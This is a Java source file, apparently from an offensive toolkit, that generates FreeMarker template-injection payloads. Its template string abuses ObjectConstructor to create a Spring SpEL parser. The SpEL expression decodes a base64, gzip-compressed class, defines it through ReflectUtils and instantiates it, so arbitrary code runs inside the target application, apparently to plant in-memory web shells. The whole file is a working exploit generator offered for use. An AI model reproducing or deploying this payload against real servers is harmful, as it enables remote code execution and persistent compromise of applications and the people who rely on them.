package com.reajason.javaweb.packer.freemarker;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.base64.GzipBase64Packer;
import org.kohsuke.MetaInfServices;

/**
 * Uses FreeMarker's ObjectConstructor to create a SpEL parser and evaluate a
 * compressed class-definition expression.
 *
 * @author ReaJason
 * @since 2026/8/30
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.FreemarkerSpELSpringGzip, parent = Packers.Freemarker, order = 1720)
public class FreemarkerSpELSpringGzipPacker implements Packer {

    @Override
    public boolean transportedAsSpelExpression() {
        return true;
    }
    String template = "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.StreamUtils).copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()\").getValue()}";

    @Override
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", new GzipBase64Packer().pack(config));
    }
}
